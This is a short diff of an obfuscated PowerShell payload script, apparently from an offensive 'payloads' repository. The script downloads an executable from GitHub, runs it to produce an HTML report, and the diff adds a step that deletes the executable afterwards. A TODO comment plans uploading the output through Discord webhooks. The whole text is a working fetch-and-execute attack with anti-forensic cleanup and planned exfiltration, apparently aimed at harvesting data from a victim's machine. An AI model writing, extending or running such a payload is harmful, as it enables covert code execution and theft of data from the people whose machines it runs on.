@@ -7,7 +7,12 @@ function uCmLBUkWvE {
 $TcDrgEHOCo = uCmLBUkWvE
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/w.exe' -OutFile "$TcDrgEHOCo.exe"
 
-Start-Sleep 2
 
 $zXMpyWDQjY = uCmLBUkWvE
 iex "./$TcDrgEHOCo.exe /shtml $zXMpyWDQjY.html"
+
+Start-Sleep 2
+
+Remove-Item "$TcDrgEHOCo.exe"
+
+# TODO: remote upload and removal of html via discord webhooks
